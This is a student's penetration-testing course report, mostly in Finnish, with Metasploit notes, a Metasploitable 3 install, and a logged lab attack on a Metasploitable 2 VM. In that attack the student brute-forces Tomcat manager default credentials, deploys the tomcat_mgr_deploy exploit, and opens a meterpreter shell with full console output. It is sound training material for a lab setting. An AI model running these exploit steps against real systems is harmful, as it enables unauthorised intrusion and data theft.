# h5 Script Kiddie

Part of Penetration Testing ICT4TN027-3007 course of Haaga-Helia University of Applied Sciences held by Tero Karvinen. Course is in Finnish.  
    
Course page: https://terokarvinen.com/2021/penetration-testing-course-2022-spring/  

Palautus sovitusti Laksuun.

Harjoittele vain luvallisiin harjoitusmaaleihin. Irrota tarvittaessa koneet Internetistä ja seuraa hyökkäysohjelmien toimintaa toisella työkalulla.

## v) Lue artikkelit ja katso videot, tee kustakin muistiinpanot (muutama ranskalainen viiva per artikkeli/video). Tässä v-kohdassa ei tarvitse tehdä mitään kokeita koneella.

### € Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit (kohdasta "Conducting a penetration test with Metasploit" luvun loppuun)

- use - Valitse käytettävä moduuli
- show - Näytä vaihtoehdot valitusta optiosta (esim. show payloads)
- set - Aseta arvo (esim. set RHOSTS)
- setg - Aseta arvo globaalisti
- exploit - Aja exploitti
- back - Palaa alkuun

- info - Tietoja valitusta kohteesta
- search - Etsi moduulia
- check - Tarkista onko kohde haavoittuva valitulle moduulille
- sessions - Lista avoimista sessioista

- Tietokanta helpottaa käyttöä (db_ komennot)
- Tukee useita työtiloja (workspace)  

Lähde:https://learning.oreilly.com/library/view/mastering-metasploit-/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-30

### Vapaavalintainen läpikävely (walktrough) yhdestä murrosta. Voit siis valita yhden läpikävelyn mistä tahansa näistä kanavista tai blogista. Kanavilla on muitakin artikkeleita, valitse tästä läpikävely. Keskity tiivistäessä asioihin, joita voisit itse soveltaa hyökätessä. Tässä on yli 200 h videota, niitä ei tarvitse katsoa kaikkia.

- 0xdf https://0xdf.gitlab.io/
- ippsec https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos
- John Hammond https://www.youtube.com/user/RootOfTheNull/videos?sort=p

- HTB: Mischief

Source: https://0xdf.gitlab.io/2019/01/05/htb-mischief.html

Hack The Box Mischief. As described on the site was an "easy" hack but still too much for me to understand most of it.  

- nmap scan that identified snmp service
- snmp-walk tool to get OID (Object Identifiers) from the server
- snmp-mibs-downloader to make snmp walk output (OIDs) human-readable
- Went way too complex for me to understand after the first few steps..

## a) Emmental. Asenna Metasploitable 3  

Valitsen asennustavaksi Vagrantin Metasploitable 3 virallisen github repositorion ohjeilla.

Lähde: https://github.com/rapid7/metasploitable3

```
$ mkdir metasploitable3-workspace
$ cd metasploitable3-workspace/
$ curl -O https://raw.githubusercontent.com/rapid7/metasploitable3/master/Vagrantfile && vagrant up
1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require'
/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require': cannot load such file -- winrm (LoadError)
```
Päädyttiin siis virheeseen, jonka mukaan winrm nimistä tiedostoa ei voida ladata. 

Lähdin hakemaan ongelmaan ratkaisua ja löysin seuraavan issuen Metasploitablen github repositoriosta:  
https://github.com/rapid7/metasploitable3/issues/378

Keskustelussa kehotetaan päivittämään Vagrant uusimpaan versioon. Itselläni on uusin Debianin perusrepositorioista ladattu Vagrant versio ja en halua lisäillä Vagrantin sivujen ohjeiden mukaan lisärepositorioita koneelleni, joten menin toisen löytyneen ohjeen mukaan:  
"On a fresh kali install as of 3/31/2021 I fixed this with:sudo gem install winrm. Then another error and I had to run sudo gem install winrm-fs . Then success."  

Ohjeen on siis asentaa riippuvuudet Rubyn pakettimanagerilla gemillä joten tein tämän ja jouiduin vielä asentamaan winrm-elevated paketin:
```
$ sudo gem install winrm
$ vagrant up
1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require'
/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require': cannot load such file -- winrm-elevated (LoadError)
$ sudo gem install winrm-elevated
$ vagrant up --provider virtualbox
```
Huomasin, että asennuksen jälkeen Virtualboxiini oli ilmestynyt kaksi eri konetta:
<img src="l5meta3vbox.png">

Näyttäisi siis, että asennuksen mukana tulee Ubuntu 14.04 ja Windows 2k8 palvelin. Vagrant loi näille myös näköjään automaattisesti virtualhost verkon vboxnet2 eli siirsin myös Kali Linux koneeni tuohon verkkoon ja tein ping sweepin nmapilla:

```
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:95:bd:54 brd ff:ff:ff:ff:ff:ff
    inet 172.28.128.5/24 brd 172.28.128.255 scope global dynamic noprefixroute eth0
       valid_lft 596sec preferred_lft 596sec
    inet6 fe80::a00:27ff:fe95:bd54/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever

┌──(pajazzo㉿kali)-[~]
└─$ sudo nmap -sn 172.28.128.1-20
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 14:44 EEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 172.28.128.1
Host is up (0.00036s latency).
MAC Address: 0A:00:27:00:00:02 (Unknown)
Nmap scan report for 172.28.128.2
Host is up (0.00027s latency).
MAC Address: 08:00:27:79:2E:B3 (Oracle VirtualBox virtual NIC)
Nmap scan report for 172.28.128.3
Host is up (0.00036s latency).
MAC Address: 08:00:27:AA:EE:5A (Oracle VirtualBox virtual NIC)
Nmap scan report for 172.28.128.4
Host is up (0.00034s latency).
MAC Address: 08:00:27:0C:35:BD (Oracle VirtualBox virtual NIC)
Nmap scan report for 172.28.128.5
Host is up.
Nmap done: 20 IP addresses (5 hosts up) scanned in 1.43 seconds
```
Sweepillä löytyi 3 Virtualbox konetta, joista yksi on oma Kali Linuxini joten lienee turvallista ajatella, että kaksi muuta ovat luodut Metasploitable 3 koneet.  

## b) Msf. Murtaudu Metasploitable 3 käyttämällä Metasploittia 'sudo msfconsole'

Tehtävän vastaus [täältä](Scans/L5meta3nmapA.md)  

## c) Rat. Demonstroi meterpreter:n käyttöä

Lähde: https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

Meterpreter on Metasploitiin kuuluva payload jonka avulla tehdään jotain? En oikein ymmärtänyt yhdenkään lukemani sivun selitystä työkalusta tai miten sitä pitäisi käyttää. Jonkinlainen Ruby Shell ilmeisesti jonka tavoitteena on, etteivät hyökkääjän toimet olisi niin näkyviä.

En valitettavasti keksi mitään keinoa emonstroida tätä, koska ohjeet joita löydän aloittavat joko siitä, että meterpreter konsoli on auki tai niissä aloitetaan oman payloadin kirjoittaminen. Pitäisikö tässä keksiä joltain kohdekoneelta, jokin heikkous, johon tätä voidaan käyttää? 

Useissa ohjeissa myös käytetään Windows kohteita, joita minulla ei ole käytössäni.

Yritän vielä myöhemmin jatkaa.  

**Jatkoa 13.5.2021**

Olin jo aiemmin skannannut Metasploitable 2 koneen: 
```
msf6 > services 172.28.128.6
Services
========

host          port   proto  name         state  info
----          ----   -----  ----         -----  ----
172.28.128.6  21     tcp    ftp          open   vsftpd 2.3.4
172.28.128.6  22     tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
172.28.128.6  23     tcp    telnet       open   Linux telnetd
172.28.128.6  25     tcp    smtp         open   Postfix smtpd
172.28.128.6  53     tcp    domain       open   ISC BIND 9.4.2
172.28.128.6  80     tcp    http         open   Apache httpd 2.2.8 (Ubuntu) DAV/2
172.28.128.6  111    tcp    rpcbind      open   2 RPC #100000
172.28.128.6  139    tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
172.28.128.6  445    tcp    netbios-ssn  open   Samba smbd 3.0.20-Debian workgroup: WORKGROUP
172.28.128.6  512    tcp    exec         open   netkit-rsh rexecd
172.28.128.6  513    tcp    login        open   OpenBSD or Solaris rlogind
172.28.128.6  514    tcp    shell        open   Netkit rshd
172.28.128.6  1099   tcp    java-rmi     open   GNU Classpath grmiregistry
172.28.128.6  1524   tcp    bindshell    open   Metasploitable root shell
172.28.128.6  2049   tcp    nfs          open   2-4 RPC #100003
172.28.128.6  2121   tcp    ftp          open   ProFTPD 1.3.1
172.28.128.6  3306   tcp    mysql        open   MySQL 5.0.51a-3ubuntu5
172.28.128.6  3632   tcp    distccd      open   distccd v1 (GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)
172.28.128.6  5432   tcp    postgresql   open   PostgreSQL DB 8.3.0 - 8.3.7
172.28.128.6  5900   tcp    vnc          open   VNC protocol 3.3
172.28.128.6  6000   tcp    x11          open   access denied
172.28.128.6  6667   tcp    irc          open   UnrealIRCd
172.28.128.6  6697   tcp    irc          open   UnrealIRCd
172.28.128.6  8009   tcp    ajp13        open   Apache Jserv Protocol v1.3
172.28.128.6  8180   tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1
172.28.128.6  8787   tcp    drb          open   Ruby DRb RMI Ruby 1.8; path /usr/lib/ruby/1.8/drb
172.28.128.6  33434  tcp    mountd       open   1-3 RPC #100005
172.28.128.6  40148  tcp    nlockmgr     open   1-4 RPC #100021
172.28.128.6  44051  tcp    status       open   1 RPC #100024
172.28.128.6  46567  tcp    java-rmi     open   GNU Classpath grmiregistry
```

Portissa 8180 on käytössä Apache Tomcat ja kyseisen portin versio aggressivinen skannaus (-Av) palautti seuraavaa:
```
PORT     STATE SERVICE VERSION
8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/5.5
```

Tarkisin vielä selaimelta, mitä sivulta löytyy:

<img src='Screenshots/Lesson05TomcatFront.png'>  

Manager ja adminkonsolit olivat salasanan takana:

<img src='Screenshots/Lesson05TomcatAdmin.png'> 
<img src='Screenshots/Lesson05TomcatManager.png'>  

Katsoin, mitä metasploitista löytyy tämän palvelun osalta:
```
msf6 > search Apache Tomcat 5.5

Matching Modules
================

   #  Name                                                Disclosure Date  Rank       Check  Description
   -  ----                                                ---------------  ----       -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat                2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   1  exploit/multi/http/tomcat_mgr_deploy                2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   2  exploit/multi/http/tomcat_mgr_upload                2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   3  auxiliary/dos/http/apache_tomcat_transfer_encoding  2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   4  auxiliary/scanner/http/tomcat_enum                                   normal     No     Apache Tomcat User Enumeration
   5  auxiliary/admin/http/tomcat_administration                           normal     No     Tomcat Administration Tool Default Access
   6  auxiliary/admin/http/tomcat_utf8_traversal          2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   7  auxiliary/admin/http/trendmicro_dlp_traversal       2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/admin/http/trendmicro_dlp_traversal

```

Valitsin listan toisen vaihtoehdon, joka näyttää hyödyntävän heikkoutta manager konsolissa koodin suorittamiseksi:
```
msf6 > use 1
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_deploy) > options

Module options (exploit/multi/http/tomcat_mgr_deploy):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/U
                                            sing-Metasploit
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Optioita katsoessa huomasin heti, että seuraavat pitää ainakin määrittää:
- RHOSTS 172.28.128.6
- RPORT vaihtaa 8180
- PAYLOAD

Mahdollisesti muutakin, mutta kokeilin näillä ja päädyin virheeseen payloadissa, joten vaihdoin sen toiseen. Lisää virheitä, kuten automaattinen kohteen valinta ei onnistu:
```
msf6 exploit(multi/http/tomcat_mgr_deploy) > set RHOSTS 172.28.128.6
RHOSTS => 172.28.128.6
msf6 exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8180
RPORT => 8180
msf6 exploit(multi/http/tomcat_mgr_deploy) > run

[-] Exploit failed: linux/x86/meterpreter/bind_ipv6_tcp is not a compatible payload.
[*] Exploit completed, but no session was created.

msf6 exploit(multi/http/tomcat_mgr_deploy) > show payloads

Compatible Payloads
===================

   #   Name                                     Disclosure Date  Rank    Check  Description
   -   ----                                     ---------------  ----    -----  -----------
   0   payload/generic/custom                                    normal  No     Custom Payload
   1   payload/generic/shell_bind_tcp                            normal  No     Generic Command Shell, Bind TCP Inline
   2   payload/generic/shell_reverse_tcp                         normal  No     Generic Command Shell, Reverse TCP Inline
   3   payload/generic/ssh/interact                              normal  No     Interact with Established SSH Connection
   4   payload/java/jsp_shell_bind_tcp                           normal  No     Java JSP Command Shell, Bind TCP Inline
   5   payload/java/jsp_shell_reverse_tcp                        normal  No     Java JSP Command Shell, Reverse TCP Inline
   6   payload/java/meterpreter/bind_tcp                         normal  No     Java Meterpreter, Java Bind TCP Stager
   7   payload/java/meterpreter/reverse_http                     normal  No     Java Meterpreter, Java Reverse HTTP Stager
   8   payload/java/meterpreter/reverse_https                    normal  No     Java Meterpreter, Java Reverse HTTPS Stager
   9   payload/java/meterpreter/reverse_tcp                      normal  No     Java Meterpreter, Java Reverse TCP Stager
   10  payload/java/shell/bind_tcp                               normal  No     Command Shell, Java Bind TCP Stager
   11  payload/java/shell/reverse_tcp                            normal  No     Command Shell, Java Reverse TCP Stager
   12  payload/java/shell_reverse_tcp                            normal  No     Java Command Shell, Reverse TCP Inline
   13  payload/multi/meterpreter/reverse_http                    normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   14  payload/multi/meterpreter/reverse_https                   normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)

msf6 exploit(multi/http/tomcat_mgr_deploy) > set PAYLOAD 7
PAYLOAD => java/meterpreter/reverse_http
msf6 exploit(multi/http/tomcat_mgr_deploy) > run

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started HTTP reverse handler on http://127.0.0.1:4444
[*] Attempting to automatically select a target...
[-] Failed: Error requesting /manager/serverinfo
[-] Exploit aborted due to failure: no-target: Unable to automatically select a target
[*] Exploit completed, but no session was created.
```
 
Valitsin kohteen ja yritin uudelleen, mutta päädyin taas payload incompatibility virheeseen:  
```
msf6 exploit(multi/http/tomcat_mgr_deploy) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   Java Universal
   2   Windows Universal
   3   Linux x86


msf6 exploit(multi/http/tomcat_mgr_deploy) > set TARGET 3
TARGET => 3
msf6 exploit(multi/http/tomcat_mgr_deploy) > run

[-] Exploit failed: java/meterpreter/reverse_http is not a compatible payload.
```

Uusi payload sisään:
```
msf6 exploit(multi/http/tomcat_mgr_deploy) > show payloads
## Tässä todella iso lista payloadeja, joten karsin turhat pois
   8   payload/linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
msf6 exploit(multi/http/tomcat_mgr_deploy) > set PAYLOAD 8
PAYLOAD => linux/x86/meterpreter/bind_ipv6_tcp
msf6 exploit(multi/http/tomcat_mgr_deploy) > run

[*] Using manually select target "Linux x86"
[*] Uploading 1597 bytes as 49xE0bHSepusvd0hnObs2bDD2.war ...
[!] Warning: The web site asked for authentication: Basic realm="Tomcat Manager Application"
[-] Exploit aborted due to failure: unknown: Upload failed on /manager/deploy?path=/49xE0bHSepusvd0hnObs2bDD2 [401 Unauthorized]
[*] Exploit completed, but no session was created.

```
Eli autentikointivirhettä. Tässä kohtaa minuun iski pieni hämmennys kuinka saada käyttäjätunnukset. Löysin pienen etsinnän jälkeen Kalin wordlists osastosta seuraavan:

**Jatkoa 14.5.20211**

```
$ ls /usr/share/wordlists/metasploit/ | grep tomcat                                                           
tomcat_mgr_default_pass.txt
tomcat_mgr_default_userpass.txt
tomcat_mgr_default_users.txt
```

Eli todennäköisimmin jokin keino on jolla voin automatisoida hyökkäyksen. Jouduin lopulta etsimään tietoa hakukoneesta ja päädyin walkthrough sivulle, jota selasin vain sen verran, että sivulla mainittiin Metasploitista löytyvän tähän sopiva hyökkäys (https://medium.com/@SumanNathani/exploiting-metasploitable-2-using-tomcat-vulnerability-and-defacing-default-page-f6d7d55b748e).  

Lähdin siis hakemaan:
```
msf6 > search tomcat
23  auxiliary/scanner/http/tomcat_mgr_login     normal     No     Tomcat Application Manager Login Utility
msf6 > use 23
msf6 auxiliary(scanner/http/tomcat_mgr_login) > options

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                   Required  Description
   ----              ---------------                   --------  -----------
   BLANK_PASSWORDS   false                             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                 yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                             no        Try each user/password couple stored in the current datab
                                                                 ase
   DB_ALL_PASS       false                             no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                             no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                              no        Skip existing credentials stored in the current database
                                                                 (Accepted: none, user, user&realm)
   PASSWORD                                            no        The HTTP password to specify for authentication
   PASS_FILE         /usr/share/metasploit-framework/  no        File containing passwords, one per line
                     data/wordlists/tomcat_mgr_defaul
                     t_pass.txt
   Proxies                                             no        A proxy chain of format type:host:port[,type:host:port][.
                                                                 ..]
   RHOSTS                                              yes       The target host(s), see https://github.com/rapid7/metaspl
                                                                 oit-framework/wiki/Using-Metasploit
   RPORT             8080                              yes       The target port (TCP)
   SSL               false                             no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                             yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                     yes       URI for Manager login. Default is /manager/html
   THREADS           1                                 yes       The number of concurrent threads (max one per host)
   USERNAME                                            no        The HTTP username to specify for authentication
   USERPASS_FILE     /usr/share/metasploit-framework/  no        File containing users and passwords separated by space, o
                     data/wordlists/tomcat_mgr_defaul            ne pair per line
                     t_userpass.txt
   USER_AS_PASS      false                             no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/  no        File containing users, one per line
                     data/wordlists/tomcat_mgr_defaul
                     t_users.txt
   VERBOSE           true                              yes       Whether to print output for all attempts
   VHOST                                               no        HTTP server virtual host
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 172.28.128.4
RHOSTS => 172.28.128.4
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
RPORT => 8180
```

Kun kohde ja portti oli asetettu oikeaksi oli aika hyökätä ja tosiaan yksi yhdistelmä tuotti tulosta:
```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
[+] 172.28.128.4:8180 - Login Successful: tomcat:tomcat
```

Nyt voidaan siis palata edellisen hyökkäyksen pariin (en käy vaiheita uudelleen läpi, joten tässä options ja run komennot):
```
msf6 exploit(multi/http/tomcat_mgr_deploy) > options

Module options (exploit/multi/http/tomcat_mgr_deploy):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  tomcat           no        The password for the specified username
   HttpUsername  tomcat           no        The username to authenticate as
   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        172.28.128.4     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Us
                                            ing-Metasploit
   RPORT         8180             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                          no        HTTP server virtual host


Payload options (linux/x86/meterpreter/bind_ipv6_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  172.28.128.4     no        The target address


Exploit target:

   Id  Name
   --  ----
   3   Linux x86
msf6 exploit(multi/http/tomcat_mgr_deploy) > run

[*] Using manually select target "Linux x86"
[*] Uploading 1642 bytes as AAgrp0hSoPt6Iaj67r7WL.war ...
[*] Executing /AAgrp0hSoPt6Iaj67r7WL/KYg5WHAytt7qQQBhunFwxjM.jsp...
[*] Undeploying AAgrp0hSoPt6Iaj67r7WL ...
[*] Started bind TCP handler against 172.28.128.4:4444
[*] Sending stage (989032 bytes) to 172.28.128.4
[*] Meterpreter session 1 opened (172.28.128.3:35329 -> 172.28.128.4:4444 ) at 2022-05-14 10:18:11 +0300

meterpreter > help
meterpreter > getuid
Server username: tomcat55
meterpreter > sysinfo
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > download /home/msfadmin/vulnerable/mysql-ssl/
```




## ~~e) Vapaaehtoinen: ExploitDB offline. Murtaudu johonkin harjoitusmaaliin käyttäen hyökkäystä, jonka etsit 'searchsploit' työkalulla. Valitse sellainen hyökkäys, joka ei tule suoraan Metasploitin mukana.~~

## ~~Vapaaehtoinen: NSA was here. Kokeile Ghidraa. Voit esimerkiksi kääntää jonkin oikein yksinkertaisen ohjelmasi binääriksi, ja katsoa miltä se näyttää.~~
